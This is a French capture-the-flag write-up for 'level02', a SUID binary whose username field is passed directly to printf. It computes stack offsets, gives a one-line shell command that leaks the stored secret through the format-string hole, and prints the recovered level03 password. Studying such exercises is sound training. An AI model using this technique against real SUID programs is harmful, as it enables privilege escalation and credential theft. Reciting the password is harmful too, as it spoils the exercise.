# level02

## 0. Prérequis : les spécificateurs `printf` en convention 64 bits

### Où `printf` va chercher ses arguments

`printf` est une fonction **variadique** : elle prend un nombre d'arguments
inconnu à la compilation. Elle ne les « compte » pas — elle lit **la chaîne de
format**, et à chaque spécificateur (`%d`, `%x`, `%p`, `%s`…) elle va chercher
**l'argument suivant**, toujours dans le même ordre imposé par la convention
d'appel x86-64 :

```
1er argument  → rdi   ← ICI la chaîne de format elle-même
2e  argument  → rsi   ┐
3e  argument  → rdx   │
4e  argument  → rcx   ├─ les "arguments variables" lus par les %…
5e  argument  → r8    │   (5 premiers dans des registres)
6e  argument  → r9    ┘
7e  argument  → [pile]  ┐
8e  argument  → [pile]  ├─ puis on continue SUR LA PILE
…               …       ┘
```

Autrement dit : `rdi` contient le format, donc le **1er `%…` lit `rsi`**, le 2e
lit `rdx`, … le 5e lit `r9`, et **à partir du 6e `%…` on lit la pile**, qword
par qword.


### Les spécificateurs utiles ici

| Spéc. | Lit l'argument comme… | Usage dans l'attaque |
|-------|-----------------------|----------------------|
| `%p`  | un pointeur (hex 64 bits) | **dumper** un qword de la pile |
| `%x`  | un entier hex 32 bits     | idem, mais 4 octets |
| `%s`  | **l'adresse** d'une chaîne, qu'elle déréférence | afficher une chaîne pointée |
| `%n`  | **écrit** le nb d'octets déjà affichés à l'adresse pointée | (écriture mémoire) |

`%p` et `%x` **lisent et affichent** la valeur du slot d'argument. `%s` et `%n`
traitent le slot comme une **adresse** (dangereux si ce n'en est pas une →
segfault).

## 1. Analyse

### Chaînes essentielles (.rodata)

```
0x400bb2  "/home/users/level03/.pass"   ← fichier ouvert par fopen (mode "r")
0x400d22  "Greetings, %s!\n"            ← branche succès (printf)
0x400d32  "/bin/sh"                     ← argument de system()
0x400d3a  " does not have access!"      ← branche échec
0x400cd9  "--[ Username: "
0x400ce8  "--[ Password: "
```

Le binaire ouvre le **mot de passe de level03** ; étant SUID, il a le droit de
le lire — pas nous.

### Variables (dans le cadre de pile)

```
4008e6: lea -0xa0(%rbp) → secret du fichier   ( 41 o.)   fread(…, 1, 0x29, fp)
4009cd: lea -0x70(%rbp) → buffer "username"   (100 o.)   fgets(…, 0x64, stdin)
400a10: lea -0x110(%rbp) → buffer "password"   (100 o.)   fgets(…, 0x64, stdin)
```

### Déroulement de `main`

```asm
; fp = fopen("/home/users/level03/.pass", "r")   (sinon erreur + exit)
; fread(secret=-0xa0, 1, 0x29, fp)               → lit 41 octets du fichier
;   puis strcspn + movb $0 : coupe le '\n'  → secret = 40 caractères
;   exige exactement 41 octets lus (cmpl $0x29), sinon erreur + exit

4009b1:  printf("--[ Username: ")
4009cd:  lea -0x70(%rbp),%rax ; fgets(username, 100, stdin) ; strip '\n'

4009f4:  printf("--[ Password: ")
400a10:  lea -0x110(%rbp),%rax ; fgets(password, 100, stdin) ; strip '\n'

400a51:  lea -0xa0(%rbp),%rax       ; arg1 = secret
400a4a:  lea -0x110(%rbp),%rcx      ; arg2 = password
400a58:  mov $0x29,%edx             ; n = 41
400a63:  callq strncmp@plt          ; strncmp(secret, password, 41)
400a68:  test %eax,%eax
400a6a:  jne  400a96                ; différents → ÉCHEC
```

Branche **succès** (`password == secret`) :
```asm
400a6c:  printf("Greetings, %s!\n", username)
400a8a:  callq system@plt           ; system("/bin/sh")   → shell SUID (level03)
```

Branche **échec** (`400a96`) :
```asm
400a9a:  mov %rax,%rdi              ; rdi = username
400a9d:  mov $0x0,%eax
400aa2:  callq printf@plt           ; printf(username)    ← username comme FORMAT
400aa7:  puts(" does not have access!")
400ab6:  callq exit@plt             ; exit(1)
```

## 2. Reconnaissance

### Le mot de passe attendu nous est inconnu

Pour atteindre `system("/bin/sh")` (shell avec les droits SUID, donc level03),
il faut que `password == secret`, où `secret` est le contenu de
`/home/users/level03/.pass` — précisément ce qu'on cherche à obtenir et qu'on
ne peut pas lire soi-même. La comparaison directe est donc une impasse en l'état.

### La faille : format string sur le username

À `0x400a9d`, dans la branche d'échec :

```asm
printf(username)      ; rdi = username (contrôlé), eax = 0, aucun autre argument
```

`username` est passé **directement comme chaîne de format** à `printf`, sans
format fixe. C'est une **faille de format string** : si on saisit des
spécificateurs (`%p`, `%x`, `%s`…) dans le champ *Username*, `printf` les
interprète et lit des valeurs là où il croit trouver ses arguments — c'est-à-dire
dans les registres puis **sur la pile**.

Or le `secret` (le mot de passe de level03) a été chargé par `fread` sur la
pile, en `-0xa0(%rbp)`. Au moment du `printf`, `rsp = rbp - 0x120`, donc le
secret se trouve à `0x120 - 0xa0 = 0x80 = 128` octets (16 qwords) au-dessus de
`rsp`. En convention 64 bits, les 5 premiers `%p` consomment les registres
(`rsi, rdx, rcx, r8, r9`), puis la pile prend le relais à partir du 6ᵉ. Le
secret devrait donc apparaître aux alentours de **`%22$p` … `%27$p`** (40
caractères ≈ 5 qwords), à relire en ASCII little-endian.

**Conclusion** : on peut faire fuiter le mot de passe de level03 via la faille
de format string du champ *Username*, sur une tentative volontairement erronée.
Et comme le secret fuité **est** le contenu de `/home/users/level03/.pass`
(c'est-à-dire le mot de passe de level03), la fuite suffit : inutile de
déclencher `system("/bin/sh")`, qui ne servirait qu'à `cat` le même fichier. Un
**seul run** résout le level — voir partie 3.

## 3. Exploitation

### 3.1 Principe : fuiter en un seul run

On exploite `printf(username)` (branche échec) pour **lire la pile**, où se trouve
le `secret`. En un seul passage :

```
--[ Username: <chaîne de format qui dump la pile>
--[ Password: <n'importe quoi de faux>
```

Le password faux fait échouer `strncmp`, ce qui exécute `printf(username)` → la
pile (donc le secret) s'affiche. On décode → c'est le mot de passe de level03.

### 3.2 Localiser le secret sur la pile

Pour savoir la valeur de `N` tel que `%N$p` **tombe sur le secret**, il faut sa position depuis `rsp`.

Au moment du `printf`, `rsp = rbp - 0x120` et le secret est en `rbp - 0xa0`,
soit:
```
distance = (adresse du secret) − (rsp)
         = (rbp − 0xa0) − (rbp − 0x120)
         = (rbp − 160) − (rbp − 288)
         = rbp − 160 − rbp + 288
         = 288 − 160
         = 128 octets
```

D'autre part (cf. partie 0) les 5 premiers `%…` lisent les registres, et le 6ᵉ lit le
**1er qword de la pile** = `[rsp]`. Donc, en spécificateurs positionnels :

```
%6$p   → [rsp + 0]       (1er qword pile)
%7$p   → [rsp + 8]
…
%N$p   → [rsp + 8*(N-6)]
```

Donc le secret commence à `[rsp + 8*(N-6)]` = `[rsp + 128]`:
```
=> 8*(N-6) = 128
=> N-6 = 16
=> N = 22
```
Les 5 qwords (= 40 octets) de secret couvrent donc :

```
%22$p %23$p %24$p %25$p %26$p
```

### 3.3 Dump et reconstruction

Chaque `%p` affiche un qword en hexadécimal **little-endian** : il faut inverser
l'ordre des octets pour retrouver le texte. Exemple : si `%22$p` renvoie
`0x6463626136353433`, les octets en mémoire sont `33 34 35 36 61 62 63 64` =
`"3456abcd"`.

Commande de fuite (un seul run) :

```sh
{ printf '%%22$p %%23$p %%24$p %%25$p %%26$p\n'; printf 'x\n'; } | ./level02
```

Puis on recompose le secret à partir des 5 valeurs affichées avec le script `convert.py`

La chaîne obtenue `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H` **est le mot de passe de level03**.
